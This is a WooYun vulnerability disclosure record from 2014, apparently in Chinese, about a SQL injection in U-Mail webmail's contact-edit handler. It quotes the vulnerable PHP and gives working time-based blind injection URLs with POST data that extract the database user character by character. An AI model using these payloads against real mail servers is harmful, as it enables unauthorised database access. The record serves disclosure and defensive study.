{"id": 49649, "wybug_id": "wooyun-2014-080604", "wybug_title": "U-Mail某处sql注射漏洞", "wybug_corp": "U-Mail", "wybug_author": "menmen519", "wybug_date": "2014-10-26 23:15", "wybug_open_date": "2015-01-24 23:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-24：\t细节向公众公开  简要描述： U-Mail sql注射 U-mail 进行了文件更新其他的漏洞已经被修补了 但是还有一处没有进行修补 详细说明：  o_concat.php:\nif ( ACTION == \"contact-edit\" ){\t\t\t\t$contact_id = gss( $_GET['id'] );\t\t\t\t$group_list = explode( \",\", trim( $_POST['group_list'] ) );\t\t\t\t$group_change = gss( $_POST['group_change'] );\t\t\t\tif ( !$contact_id && !check_post( ) )\t\t\t\t{\t\t\t\t\t\t\t\tdump_json( array( \"status\" => 0, \"message\" => \"参数错误！\" ) );\t\t\t\t}\t\t\t\t$birthday = gss( $_POST['bd_year'] ).\"-\".gss( $_POST['bd_month'] ).\"-\".gss( $_POST['bd_day'] );\t\t\t\t$data = array(\t\t\t\t\t\t\t\t\"fullname\" => gss( $_POST['fullname'] ),\t\t\t\t\t\t\t\t\"birthday\" => $birthday,\t\t\t\t\t\t\t\t\"pref_email\" => gss( $_POST['pref_email'] ),\t\t\t\t\t\t\t\t\"pref_tel\" => gss( $_POST['pref_tel'] ),\t\t\t\t\t\t\t\t\"im_qq\" => gss( $_POST['im_qq'] ),\t\t\t\t\t\t\t\t\"im_msn\" => gss( $_POST['im_msn'] ),\t\t\t\t\t\t\t\t\"homepage\" => gss( $_POST['homepage'] ),\t\t\t\t\t\t\t\t\"remark\" => gss( $_POST['remark'] ),\t\t\t\t\t\t\t\t\"home_country\" => gss( $_POST['home_country'] ),\t\t\t\t\t\t\t\t\"home_state\" => gss( $_POST['home_state'] ),\t\t\t\t\t\t\t\t\"home_city\" => gss( $_POST['home_city'] ),\t\t\t\t\t\t\t\t\"home_address\" => gss( $_POST['home_address'] ),\t\t\t\t\t\t\t\t\"home_tel\" => gss( $_POST['home_tel'] ),\t\t\t\t\t\t\t\t\"home_zip\" => gss( $_POST['home_zip'] ),\t\t\t\t\t\t\t\t\"work_name\" => gss( $_POST['work_name'] ),\t\t\t\t\t\t\t\t\"work_department\" => gss( $_POST['work_department'] ),\t\t\t\t\t\t\t\t\"work_position\" => gss( $_POST['work_position'] ),\t\t\t\t\t\t\t\t\"work_address\" => gss( $_POST['work_address'] ),\t\t\t\t\t\t\t\t\"work_zip\" => gss( $_POST['work_zip'] ),\t\t\t\t\t\t\t\t\"work_tel\" => gss( $_POST['work_tel'] ),\t\t\t\t\t\t\t\t\"work_fax\" => gss( $_POST['work_fax'] ),\t\t\t\t\t\t\t\t\"mail_bak1\" => gss( $_POST['mail_bak1'] ),\t\t\t\t\t\t\t\t\"mail_bak2\" => gss( $_POST['mail_bak2'] ),\t\t\t\t\t\t\t\t\"updated\" => date( \"Y-m-d H:i:s\" )\t\t\t\t);\t\t\t\t$where = \"contact_id='\".$contact_id.\"'\";\t\t\t\t$result = $PAB->update_contact( $data, $where, 0 );\t\t\t\tif ( $result )\t\t\t\t{\t\t\t\t\t\t\t\tif ( $group_change )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$res = $PAB->delMapByContactID( $user_id, $contact_id, 0 );\n第一步：$contact_id = gss( $_GET['id'] );最后没有进行处理进入到了：$res = $PAB->delMapByContactID( $user_id, $contact_id, 0 );我们跟进去看看：zend解码后 有乱码 我就用响应的替换了一下\npublic function delMapByContactID( $xxx, $yyy, $zzzz = FALSE )\t\t\t\t{\t\t\t\t\t\t\t\t$_qqqq = \"user_id='\".$xxx.\"' AND contact_id IN (\".$yyy.\")\";\n访问url:http://192.168.47.132/webmail/client/pab/index.php?module=operate&action=contact-edit&id=if(1,sleep(5),1)postdata:fullname=xxx&pref_email=xxxx%40qq.com&pref_tel=15802991519&home_tel=&work_tel=&im_qq=&im_msn=&home_country=&home_state=&home_city=&home_zip=&homepage=&work_name=&work_department=&work_position=&work_address=&work_zip=&work_fax=&mail_bak1=&mail_bak2=&group_list=&bd_year=2014&bd_month=02&bd_day=&home_address=&remark=&group_change=0&group_change=xxxgroup_change=xxx 当此有值的时候 进入到了那个函数访问后 延迟五秒：抓取到的sql语句为：\n\n下来我们看poc:http://192.168.47.132/webmail/client/pab/index.php?module=operate&action=contact-edit&id=sleep(if(ascii(substr((select user()),1,1))=$NUM,sleep(5),1)))postdata:fullname=xxx&pref_email=xxxx%40qq.com&pref_tel=15802991519&home_tel=&work_tel=&im_qq=&im_msn=&home_country=&home_state=&home_city=&home_zip=&homepage=&work_name=&work_department=&work_position=&work_address=&work_zip=&work_fax=&mail_bak1=&mail_bak2=&group_list=&bd_year=2014&bd_month=02&bd_day=&home_address=&remark=&group_change=0&group_change=xxx这里的$NUM 可以进行递增 猜测 信息   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-10-31 17:39 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}